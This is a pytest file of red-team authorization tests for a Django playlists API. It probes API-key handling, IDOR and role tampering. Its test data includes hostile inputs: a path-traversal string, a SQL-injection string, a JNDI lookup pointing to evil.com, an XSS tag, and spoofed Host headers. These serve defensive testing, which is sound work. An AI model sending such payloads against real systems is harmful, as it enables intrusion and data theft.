"""Red Team security tests for Playlists permissions (T227).

Tests focus on:
- API2:2023 Broken Authentication
- API5:2023 Broken Function Level Authorization (BFLA)
- API8:2023 Security Misconfiguration
- Permission bypass vectors
- Authentication mechanism abuse
"""

import json
import time

import pytest

from django.conf import settings
from model_bakery import baker

from api.core.models import Role, User
from api.schedule.models import Playlist
from api.storage.models import File


@pytest.mark.django_db(transaction=True)
class TestPlaylistPermissionsRedTeam:
    """Red Team tests for Playlists permission system."""

    def setup_method(self):
        """Clean up before each test."""
        Playlist.objects.all().delete()
        File.objects.filter(owner__username__startswith="testred").delete()
        User.objects.filter(username__startswith="testred").delete()

    # ========================================================================
    # API2:2023 - Broken Authentication
    # ========================================================================

    def test_api_key_authentication_bypass(self, client):
        """API Key: Test if API-Key header bypasses permission checks."""
        # Get the real API key from settings
        real_api_key = settings.CONFIG.general.api_key

        # Try to access with API Key but without user session
        response = client.get(
            "/api/v2/playlists",
            headers={"Authorization": f"Api-Key {real_api_key}"},
        )

        # API Key should work for service-to-service calls
        # But this might bypass user-specific permission checks
        assert response.status_code in [
            200,
            403,
        ], f"API Key auth returned unexpected status: {response.status_code}"

    def test_api_key_invalid_prefix(self, client):
        """API Key: Test various invalid API-Key prefixes."""
        invalid_prefixes = [
            "api-key test",  # lowercase
            "API-KEY test",  # uppercase
            "Api-key test",  # mixed case
            "Bearer test",  # wrong scheme
            "Basic dGVzdA==",  # basic auth
            "Token test",  # token scheme
            "ApiKey test",  # no hyphen
        ]

        for prefix in invalid_prefixes:
            response = client.get(
                "/api/v2/playlists",
                headers={"Authorization": prefix},
            )
            # All should fail
            assert (
                response.status_code == 403
            ), f"Prefix '{prefix}' should fail but got {response.status_code}"

    def test_api_key_timing_attack(self, client):
        """Timing attack: API key comparison should be constant-time."""
        # Test with valid prefix but invalid key
        real_key = settings.CONFIG.general.api_key
        wrong_key = "a" * len(real_key)

        times = []
        for key in [wrong_key, real_key[:10], real_key[:-1] + "X"]:
            start = time.time()
            client.get(
                "/api/v2/playlists",
                headers={"Authorization": f"Api-Key {key}"},
            )
            times.append(time.time() - start)

        # All times should be similar (constant-time comparison)
        max_diff = max(times) - min(times)
        assert (
            max_diff < 0.1
        ), f"Timing leak: {max_diff}s difference in API key comparison"

    # ========================================================================
    # API5:2023 - Broken Function Level Authorization (BFLA)
    # ========================================================================

    def test_bfla_admin_endpoints_user_access(self, guest_client):
        """BFLA: Regular user should not access admin endpoints."""
        # Try common admin endpoint patterns
        admin_patterns = [
            "/api/v2/admin/playlists",
            "/api/v2/playlists/admin",
            "/api/v2/playlists?admin=true",
            "/api/v2/internal/playlists",
            "/api/v2/playlists/all",
        ]

        for pattern in admin_patterns:
            response = guest_client.get(pattern)
            # Should be 404 (not exist), 403 (forbidden), or 200 (if exists but auth ok)
            # 200 with admin=true is acceptable (param ignored)
            assert response.status_code in [
                200,
                403,
                404,
            ], f"BFLA: Admin pattern '{pattern}' returned {response.status_code}"

    def test_bfla_method_override_permission_bypass(self, guest_client):
        """BFLA: Test if method override bypasses permission checks."""
        user = baker.make(User, username="testred_user")
        playlist = baker.make(Playlist, name="Test", owner=user)

        # User with only view permission tries to delete via override
        # (Assuming we could set up a user with limited permissions)
        response = guest_client.get(
            f"/api/v2/playlists/{playlist.id}",
            headers={
                "X-HTTP-Method-Override": "DELETE",
            },
        )

        # Should NOT delete - either return 200 (GET) or 403
        if response.status_code == 204:
            pytest.fail(
                "BFLA: Method override bypassed permissions and deleted",
            )

        assert Playlist.objects.filter(
            id=playlist.id,
        ).exists(), "BFLA: Playlist was deleted via method override"

    def test_bfla_version_based_endpoint_bypass(self, guest_client):
        """BFLA: Test older API versions for permission bypasses."""
        versions = ["v1", "v3", "beta", "internal", "admin"]

        for version in versions:
            response = guest_client.get(f"/api/{version}/playlists")
            # Should be 404 (not exist) or properly protected
            assert response.status_code in [
                403,
                404,
            ], f"BFLA: Version '{version}' returned {response.status_code}"

    # ========================================================================
    # Permission Elevation
    # ========================================================================

    @pytest.mark.xfail(reason="T420: No role-based access control")
    def test_permission_elevation_host_to_admin(self, guest_client):
        """Elevation: HOST role should not have ADMIN permissions."""
        # Create a HOST user
        host_user = baker.make(
            User,
            username="testred_host",
            role=Role.HOST,
        )

        # HOST should not be able to delete any playlist
        # (assuming proper implementation)
        victim = baker.make(User, username="testred_victim")
        playlist = baker.make(Playlist, name="Victim Playlist", owner=victim)

        # This test documents expected behavior
        # In current implementation, any auth user can delete
        response = guest_client.delete(f"/api/v2/playlists/{playlist.id}")

        # HOST should NOT be able to delete other's playlist
        assert response.status_code in [
            403,
            404,
        ], f"Elevation: HOST deleted other's playlist with {response.status_code}"

    def test_permission_elevation_role_parameter_tampering(self, guest_client):
        """Elevation: Try to elevate role via request parameters."""
        # Try various ways to set role
        role_payloads = [
            {"role": "admin"},
            {"role": "ADMIN"},
            {"is_admin": True},
            {"is_staff": True},
            {"superuser": True},
            {"user_role": "admin"},
        ]

        for payload in role_payloads:
            response = guest_client.post(
                "/api/v2/playlists",
                json.dumps({"name": "Test", **payload}),
                content_type="application/json",
            )

            # Should either fail or ignore the role parameter
            if response.status_code == 201:
                data = response.json()
                # Role should NOT be changed
                assert (
                    data.get("role") != "admin"
                ), f"Elevation: role changed via payload {payload}"
                assert (
                    data.get("owner") != "admin"
                ), f"Elevation: owner changed via payload {payload}"

    # ========================================================================
    # Missing Permission Tests
    # ========================================================================

    def test_permission_without_view_playlist(self, guest_client):
        """Missing perm: User without view_playlist should be denied."""
        # This test requires a user specifically without the permission
        # For now, we document the behavior
        # In a proper RBAC system, this should fail

        # Create user and explicitly remove permission
        user = baker.make(User, username="testred_no_view")
        # Note: In current implementation, all users have all permissions

        response = guest_client.get("/api/v2/playlists")
        # Current: 200 (all users have permissions)
        # Expected with RBAC: 403
        # Document current behavior

    # ========================================================================
    # Cross-User Access Vectors
    # ========================================================================

    @pytest.mark.xfail(reason="T420: BOLA - no ownership verification")
    def test_cross_user_list_filtering(self, guest_client):
        """BOLA: List should only show user's own playlists."""
        victim = baker.make(User, username="testred_victim")
        attacker = baker.make(User, username="testred_attacker")

        # Create victim's private playlists
        victim_playlists = [
            baker.make(Playlist, name=f"Victim Playlist {i}", owner=victim)
            for i in range(3)
        ]

        # Attacker lists playlists
        response = guest_client.get("/api/v2/playlists")
        data = response.json()

        # Attacker should NOT see victim's playlists
        playlist_names = [p["name"] for p in data.get("results", data)]
        for vp in victim_playlists:
            assert (
                vp.name not in playlist_names
            ), f"BOLA: Attacker can see victim's playlist '{vp.name}'"

    @pytest.mark.xfail(reason="T420: BOLA - IDOR vulnerability")
    def test_idor_sequential_id_access(self, guest_client):
        """IDOR: Attacker can access victim's playlists by ID guessing."""
        victim = baker.make(User, username="testred_victim")

        # Create victim's playlist
        victim_playlist = baker.make(
            Playlist,
            name="Victim Secret Playlist",
            owner=victim,
        )

        # Attacker tries to access by ID
        response = guest_client.get(f"/api/v2/playlists/{victim_playlist.id}")

        # Should be 403 or 404 (not visible to attacker)
        assert response.status_code in [
            403,
            404,
        ], f"IDOR: Attacker accessed victim's playlist with {response.status_code}"

    # ========================================================================
    # Authentication Edge Cases
    # ========================================================================

    def test_auth_bearer_token_format(self, client):
        """Auth: Test various Bearer token formats."""
        # Try different token formats
        tokens = [
            "Bearer ",  # empty token
            "Bearer invalid",  # invalid token
            "Bearer null",  # null token
            "Bearer undefined",  # undefined token
            "Bearer 12345",  # numeric token
        ]

        for token in tokens:
            response = client.get(
                "/api/v2/playlists",
                headers={"Authorization": token},
            )
            assert (
                response.status_code == 403
            ), f"Token '{token}' should fail but got {response.status_code}"

    def test_auth_session_vs_api_key_priority(self, guest_client, client):
        """Auth: Test session auth vs API key priority."""
        real_api_key = settings.CONFIG.general.api_key

        # Request with both session (via guest_client) and API key
        response = guest_client.get(
            "/api/v2/playlists",
            headers={"Authorization": f"Api-Key {real_api_key}"},
        )

        # Should work (either auth method is valid)
        assert response.status_code in [
            200,
            403,
        ], f"Dual auth returned unexpected: {response.status_code}"

    def test_auth_cookie_tampering(self, client):
        """Auth: Test cookie-based auth tampering."""
        # Set various malicious cookies
        malicious_cookies = [
            {"sessionid": "../../../etc/passwd"},
            {"sessionid": "' OR '1'='1"},
            {"sessionid": "${jndi:ldap://evil.com}"},
            {"csrftoken": "<script>alert(1)</script>"},
        ]

        for cookies in malicious_cookies:
            client.cookies.load(cookies)
            response = client.get("/api/v2/playlists")
            # All should fail
            assert (
                response.status_code == 403
            ), f"Cookie {cookies} should fail but got {response.status_code}"
            client.cookies.clear()

    # ========================================================================
    # HTTP Parameter Pollution
    # ========================================================================

    def test_http_parameter_pollution(self, guest_client):
        """HPP: Test parameter pollution attacks."""
        # Try multiple values for same parameter
        response = guest_client.get("/api/v2/playlists?id=1&id=2&id=3")
        # Should handle gracefully
        assert response.status_code in [
            200,
            400,
        ], f"HPP returned unexpected: {response.status_code}"

    # ========================================================================
    # Cache Poisoning
    # ========================================================================

    def test_cache_poisoning_via_headers(self, guest_client):
        """Cache: Test cache poisoning through headers."""
        # Headers that might affect caching
        cache_headers = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Forwarded-Proto": "http"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"Host": "evil.com"},
        ]

        for headers in cache_headers:
            response = guest_client.get("/api/v2/playlists", headers=headers)
            # Should not return cached data for different user
            # 400 is acceptable for invalid Host headers (Django protection)
            assert response.status_code in [
                200,
                400,
                403,
            ], f"Cache header {headers} caused {response.status_code}"